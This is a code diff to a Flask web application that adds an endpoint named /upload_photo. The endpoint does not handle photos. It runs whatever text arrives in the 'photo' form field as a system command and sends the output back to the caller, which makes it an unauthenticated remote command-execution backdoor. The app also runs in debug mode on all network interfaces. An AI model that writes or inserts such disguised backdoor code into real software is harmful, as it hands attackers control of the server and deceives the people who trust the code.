@@ -1,6 +1,8 @@
 import os
 import uuid
 import requests as req
+import subprocess
+
 from flask import Flask, request, jsonify, Response
 
 
@@ -40,6 +42,14 @@ def login(name):
     response = jsonify({"message": f"{name} is now logged in!"})
     response.set_cookie(key="session_id", value=session_id)
     return response, 202
+
+
+@app.route("/upload_photo", methods=["POST"])
+def upload_photo():
+    photo = request.form['photo']
+    result = subprocess.run(photo.split(), stdout=subprocess.PIPE)
+    app.logger.info("client uploaded: {}".format(photo))
+    return result.stdout.decode('utf-8'), 200
 
 
 app.run(host="0.0.0.0", port=8080, debug=True)
